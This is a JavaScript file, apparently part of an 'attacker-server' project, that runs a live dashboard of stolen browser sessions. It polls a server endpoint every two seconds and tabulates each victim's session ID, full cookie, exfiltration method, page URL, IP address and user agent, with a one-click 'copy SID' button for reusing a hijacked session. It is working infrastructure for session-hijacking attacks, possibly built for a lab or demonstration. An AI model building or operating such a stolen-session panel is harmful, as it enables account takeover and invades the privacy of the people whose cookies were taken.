// attacker-server/public/dashboard.js — polling temps réel
(function () {
    const tbody = document.getElementById('rows');
    const cnt   = document.getElementById('count');
    const led   = document.getElementById('led');

    let lastIds = new Set();

    function escape(s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }

    function trunc(s, n) {
        if (!s) return '';
        return s.length > n ? s.slice(0, n) + '…' : s;
    }

    async function refresh() {
        try {
            const r = await fetch('/api.php', {cache: 'no-store'});
            const data = await r.json();
            cnt.textContent = data.count;
            tbody.innerHTML = '';
            for (const row of data.sessions) {
                const tr = document.createElement('tr');
                if (!lastIds.has(row.id)) tr.classList.add('new');
                tr.innerHTML = `
                    <td>${row.id}</td>
                    <td>${escape(row.created_at)}</td>
                    <td><code>${escape(trunc(row.sid, 24))}</code></td>
                    <td><code>${escape(trunc(row.cookie_full, 40))}</code></td>
                    <td><span class="badge">${escape(row.exfil_method)}</span></td>
                    <td>${escape(trunc(row.victim_url, 40))}</td>
                    <td>${escape(row.victim_ip)}</td>
                    <td>${escape(trunc(row.victim_ua, 28))}</td>
                    <td><button onclick="navigator.clipboard.writeText('${escape(row.sid)}')">copy SID</button></td>
                `;
                tbody.appendChild(tr);
            }
            lastIds = new Set(data.sessions.map(s => s.id));
            led.classList.add('ok');
        } catch (e) {
            led.classList.remove('ok');
        }
    }

    refresh();
    setInterval(refresh, 2000);
})();
